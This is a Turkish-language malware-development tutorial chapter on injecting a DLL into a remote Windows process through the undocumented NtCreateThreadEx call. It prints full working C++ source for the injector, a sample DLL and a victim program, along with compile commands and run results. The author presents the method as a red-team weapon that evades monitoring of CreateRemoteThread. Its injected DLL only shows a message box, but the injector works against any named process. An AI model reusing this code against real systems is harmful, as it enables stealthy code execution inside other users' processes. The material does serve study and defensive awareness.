\newpage
\subsection{21. NtCreateThreadEx ile DLL enjeksiyonu. Basit C++ örneği.}

﷽

![dll injection](./images/29/2021-12-07_00-41.png){width="80%"}    

Önceki bölümlerde [CreateRemoteThread](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html) ve [SetWindowsHookEx](https://cocomelonc.github.io/tutorial/2021/11/25/malware-injection-7.html) ile klasik DLL enjeksiyonunu yazmıştım.

Bugün başka bir DLL enjeksiyon tekniğini ele alacağım. Bu teknik, belgelenmemiş bir işlev olan `NtCreateThreadEx`'i kullanmamız anlamına geliyor. Şimdi, `VirtualAllocEx`, `WriteProcessMemory`, `WaitForSingleObject` gibi Win32API işlevlerinden ve belgelenmemiş bir Native API olan `NtCreateThreadEx`'den faydalanarak zararlı DLL'i uzak bir sürece nasıl enjekte edeceğimizi gösterelim.     

Öncelikle, zararlı DLL'imizin (`evil.c`) C++ kaynak koduna bakalım:    

```cpp
/*
DLL example for DLL injection via NtCreateThreadEx
author: @cocomelonc
https://cocomelonc.github.io/pentest/2021/12/06/malware-injection-9.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule, 
DWORD ul_reason_for_call, LPVOID lpReserved) {
  switch (ul_reason_for_call)  {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow-meow!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}

```

Her zamanki gibi oldukça basit. Sadece "Meow-meow!" mesajını gösteriyor.

DLL'imizi derleyelim:    

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
```

![dll injection 2](./images/29/2021-12-07_09-48.png){width="80%"}    

Daha sonra, zararlı yazılımımızın kaynak koduna bakalım (`hack.cpp`):    

```cpp
/*
hack.cpp
DLL injection via undocumented NtCreateThreadEx example
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/12/06/malware-injection-9.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>

#pragma comment(lib, "advapi32.lib") 

typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
  OUT PHANDLE hThread,
  IN ACCESS_MASK DesiredAccess,
  IN PVOID ObjectAttributes,
  IN HANDLE ProcessHandle,
  IN PVOID lpStartAddress,
  IN PVOID lpParameter,
  IN ULONG Flags,
  IN SIZE_T StackZeroBits,
  IN SIZE_T SizeOfStackCommit,
  IN SIZE_T SizeOfStackReserve,
  OUT PVOID lpBytesBuffer
);

// get process PID
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}

int main(int argc, char* argv[]) {
  DWORD pid = 0; // process ID
  HANDLE ph; // process handle
  HANDLE ht; // thread handle
  LPVOID rb; // remote buffer
  SIZE_T rl; // return length

  char evilDll[] = "evil.dll";
  int evilLen = sizeof(evilDll) + 1;
  
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  LPTHREAD_START_ROUTINE lb = 
  (LPTHREAD_START_ROUTINE) GetProcAddress(
    hKernel32, "LoadLibraryA");
  pNtCreateThreadEx ntCTEx = (pNtCreateThreadEx)GetProcAddress(
    GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
  
  if (ntCTEx == NULL) {
    CloseHandle(ph);
    printf("NtCreateThreadEx failed :( exiting...\n");
    return -2;
  }

  pid = findMyProc(argv[1]);
  if (pid == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  } else {
    printf("PID = %d\n", pid);

    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

    if (ph == NULL) {
      printf("OpenProcess failed :( exiting...\n");
      return -2;
    }

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, evilLen, 
    MEM_RESERVE | MEM_COMMIT, 
    PAGE_EXECUTE_READWRITE);

    // write payload to memory buffer
    WriteProcessMemory(ph, rb, evilDll, evilLen, rl); // NULL);

    ntCTEx(&ht, 0x1FFFFF, NULL, ph, 
    (LPTHREAD_START_ROUTINE) lb, rb, 
    FALSE, NULL, NULL, NULL, NULL);

    if (ht == NULL) {
      CloseHandle(ph);
      printf("ThreadHandle failed :( exiting...\n");
      return -2;
    } else {
      printf("successfully inject via NtCreateThreadEx :)\n");
    }
    
    WaitForSingleObject(ht, INFINITE);

    CloseHandle(ht);
    CloseHandle(ph);
  }
  return 0;
}

```

Bu kodun mantığını inceleyelim. Gördüğünüz gibi, ilk olarak [önceki](https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html) yazılarımdan bir işlev olan `FindMyProc`'u kullandım. Bu işlev oldukça basittir; temelde yaptığı şey, enjekte etmek istediğimiz sürecin adını alır, işletim sistemi belleğinde onu bulmaya çalışır ve eğer mevcutsa, çalışıyorsa, bu işlev o sürecin ID’sini döndürür.     

Daha sonra, ana işlevde mantığımız [klasik DLL enjeksiyonu](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html) yazımdaki ile aynıdır. Tek fark, `CreateRemoteThread` yerine `NtCreateThreadEx` işlevini kullanmamızdır:     

![dll injection 3](./images/29/2021-12-07_11-20.png){width="80%"}    

Bu kodda gösterildiği gibi, Windows API çağrısı bir Native API çağrısı ile değiştirilebilir. Örneğin, `VirtualAllocEx` yerine `NtAllocateVirtualMemory` ve `WriteProcessMemory` yerine `NtWriteProcessMemory` kullanılabilir.     

Bu yöntemin dezavantajı, işlevin belgelenmemiş olmasıdır, bu yüzden gelecekte değişebilir.    

Ancak bir sorun var. Şimdi *"kurban"* sürecimiz için basit bir kod oluşturalım (`mouse.c`):     

```cpp
/*
hack.cpp
victim process source code for DLL injection via NtCreateThreadEx
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2021/12/06/malware-injection-9.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int main() {
  MessageBox(NULL, "Squeak-squeak!", "<:( )~~", MB_OK);
  return 0;
}

```

Gördüğünüz gibi, mantık oldukça basit. Sadece `Squeak-squeak!` mesajını gösteriyor. Derleyelim:     

```bash
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-fpermissive
```

![dll injection 4](./images/29/2021-12-07_11-45.png){width="80%"}    

Ve kontrol edelim:    

![dll injection 5](./images/29/2021-12-07_12-21.png){width="80%"}    

Her şey mükemmel bir şekilde çalıştı.     

Şimdi zararlı DLL'imizi bu sürece enjekte edelim. `hack.cpp`'yi derleyelim::

```bash
x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive
```

![dll inject 6](./images/29/2021-12-07_12-24.png){width="80%"}    

Daha sonra Process Hacker 2'yi çalıştıralım:     

![dll inject 7](./images/29/2021-12-07_12-27.png){width="80%"}    

Gördüğünüz gibi, vurgulanan süreç kurban `mouse.exe`'miz.    

Basit zararlı yazılımımızı çalıştıralım:     

```powershell
.\hack.exe mouse.exe
```

![dll inject 8](./images/29/2021-12-07_12-31.png){width="80%"}    

Gördüğünüz gibi, zararlı yazılımımız kurbanın süreç ID'sini doğru bir şekilde buldu.    

Kurban sürecimizin `PID` özelliklerini inceleyelim: `3884`:     

![dll inject 9](./images/29/2021-12-07_12-34.png){width="80%"}    

![dll inject 10](./images/29/2021-12-07_12-37.png){width="80%"}    

Gördüğünüz gibi, zararlı DLL'imiz beklendiği gibi başarıyla enjekte edildi!    

Peki neden `notepad.exe` veya `svchost.exe` gibi başka bir sürece enjekte etmiyoruz?      

[Session Separation](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) hakkında okudum ve bunun bu sorunun nedeni olduğunu düşünüyorum, bu yüzden bir sorum var: Windows 10'u nasıl hacklerim? :)

Bu tekniği cephaneliğinizde bulundurmanın iyi bir nedeni, mavi takım üyeleri tarafından daha fazla araştırılan ve daha popüler olan `CreateRemoteThread`'i kullanmıyor olmamızdır.    

Umarım bu yazı, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.     

[Session Separation](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361)    
[Github'taki kaynak kod](https://github.com/cocomelonc/2021-12-06-malware-injection-9)    
